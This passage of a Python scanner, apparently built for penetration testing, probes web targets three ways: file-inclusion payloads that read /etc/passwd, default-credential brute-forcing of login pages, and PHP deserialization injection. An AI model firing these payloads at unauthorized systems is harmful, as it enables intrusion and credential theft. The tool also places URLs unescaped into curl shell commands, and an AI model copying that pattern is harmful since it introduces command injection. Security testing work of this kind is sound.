    return ToolResult(content="未发现 RCE 漏洞")


async def _test_lfi(url: str, param: str, pool) -> ToolResult:
    """文件包含检测 — LFI/RFI"""
    from urllib.parse import urlparse, parse_qs, urlunparse, urlencode

    parsed = urlparse(url)
    params = parse_qs(parsed.query)

    lfi_payloads = [
        ("../../../etc/passwd", "root:"),
        ("....//....//....//etc/passwd", "root:"),
        ("..%2F..%2F..%2Fetc%2Fpasswd", "root:"),
        ("/etc/passwd", "root:"),
        ("php://filter/convert.base64-encode/resource=/etc/passwd", "cm9vd"),
        ("file:///etc/passwd", "root:"),
    ]

    # 如果没有参数，尝试常见文件参数名
    if not params and not param:
        file_params = ["file", "path", "page", "include", "doc", "template", "lang", "filename"]
        for fp in file_params:
            for payload, marker in lfi_payloads[:2]:
                test_url = f"{url}?{fp}={payload}"
                r = await run_command(f"curl -sL -m 10 '{test_url}'", timeout=15)
                if r.success and marker in r.stdout:
                    pool.add(SharedFinding(
                        source="test_lfi", vuln_type="lfi",
                        target_url=url, parameter=fp,
                        payload=payload, severity="critical", confidence="confirmed",
                        detail="LFI file read",
                    ))
                    return ToolResult(content=f"[CRITICAL] LFI 发现! 参数: {fp}")
        return ToolResult(content="未发现文件包含漏洞")

    test_params = list(params.keys()) if params else [param]
    for pname in test_params:
        for payload, marker in lfi_payloads:
            test_params_dict = {k: v[0] for k, v in params.items()}
            test_params_dict[pname] = payload
            test_url = urlunparse(parsed._replace(query=urlencode(test_params_dict)))

            r = await run_command(f"curl -sL -m 10 '{test_url}'", timeout=15)
            if r.success and marker in r.stdout:
                pool.add(SharedFinding(
                    source="test_lfi", vuln_type="lfi",
                    target_url=url, parameter=pname,
                    payload=payload, severity="critical", confidence="confirmed",
                    detail="LFI file read",
                ))
                return ToolResult(content=f"[CRITICAL] LFI 发现! 参数: {pname}")

    return ToolResult(content="未发现文件包含漏洞")


async def _test_bruteforce(login_url: str, username_field: str, password_field: str, pool) -> ToolResult:
    """登录暴力破解测试"""
    default_creds = [
        ("admin", "admin"), ("admin", "admin123"), ("admin", "password"),
        ("admin", "123456"), ("root", "root"), ("root", "toor"),
        ("test", "test"), ("user", "user"), ("guest", "guest"),
        ("admin", "pikachu"), ("admin", "12345678"),
    ]

    # 先获取页面看有没有 CSRF token
    page_r = await run_command(f"curl -sL -m 10 '{login_url}'", timeout=15)
    if not page_r.success:
        return ToolResult(content="无法访问登录页面")

    # 提取可能的 CSRF token
    import re
    csrf_match = re.search(
        r'name=["\'](?:csrf|token|_token|csrf_token)["\'].*?value=["\']([^"\']+)',
        page_r.stdout, re.IGNORECASE,
    )
    csrf_token = csrf_match.group(1) if csrf_match else ""

    results = []
    for username, password in default_creds:
        data = f"{username_field}={shlex.quote(username)}&{password_field}={shlex.quote(password)}"
        if csrf_token:
            data += f"&token={csrf_token}"

        r = await run_command(
            f"curl -sL -m 10 -X POST -d '{data}' '{login_url}'",
            timeout=15,
        )
        if r.success:
            resp = r.stdout.lower()
            # 检查是否登录成功（不是错误页面）
            if ("welcome" in resp or "dashboard" in resp or "logout" in resp or "profile" in resp) and \
               "error" not in resp[:200] and "incorrect" not in resp[:200]:
                pool.add(SharedFinding(
                    source="test_bruteforce", vuln_type="bruteforce",
                    target_url=login_url, parameter="credentials",
                    payload=f"{username}:{password}",
                    severity="critical", confidence="confirmed",
                    detail=f"Default credentials: {username}:{password}",
                ))
                results.append(f"  [CRITICAL] {username}:{password} 登录成功!")

    if results:
        return ToolResult(content=f"暴力破解发现:\n" + "\n".join(results))
    return ToolResult(content=f"暴力破解完成: 未发现默认凭据 (尝试了 {len(default_creds)} 组)")


async def _test_deserialization(url: str, pool) -> ToolResult:
    """PHP 反序列化检测"""
    # 测试是否接受序列化数据
    import base64

    # 简单的 PHP 对象注入 payload
    php_payloads = [
        ('O:8:"stdClass":0:{}', "空对象"),
        ('a:1:{i:0;s:4:"test";}', "数组"),
        ('O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:5:"admin";}', "User对象"),
    ]

    for payload, desc in php_payloads:
        encoded = base64.b64encode(payload.encode()).decode()

        # 测试 cookie 注入
        r = await run_command(
            f"curl -sL -m 10 -b 'user={encoded}' '{url}'",
            timeout=15,
        )
        if r.success:
            resp = r.stdout.lower()
            if "unserialize" in resp or "error" in resp[:500] or "__php_incomplete_class" in resp:
                pool.add(SharedFinding(
                    source="test_deserialization", vuln_type="deserialization",
                    target_url=url, parameter="cookie",
                    payload=payload[:50], severity="high", confidence="probable",
                    detail=f"PHP deserialization response: {desc}",
                ))
                return ToolResult(content=f"[HIGH] PHP 反序列化可能触发: {desc}")

        # 测试 POST 参数
        r2 = await run_command(
            f"curl -sL -m 10 -X POST -d 'data={encoded}' '{url}'",
            timeout=15,
        )
        if r2.success:
            resp2 = r2.stdout.lower()
            if "unserialize" in resp2 or "__php_incomplete_class" in resp2:
                pool.add(SharedFinding(
                    source="test_deserialization", vuln_type="deserialization",
                    target_url=url, parameter="data",
                    payload=payload[:50], severity="high", confidence="probable",
                    detail=f"PHP deserialization via POST: {desc}",
                ))
                return ToolResult(content=f"[HIGH] PHP 反序列化可能触发 (POST): {desc}")

    return ToolResult(content="未发现 PHP 反序列化漏洞")
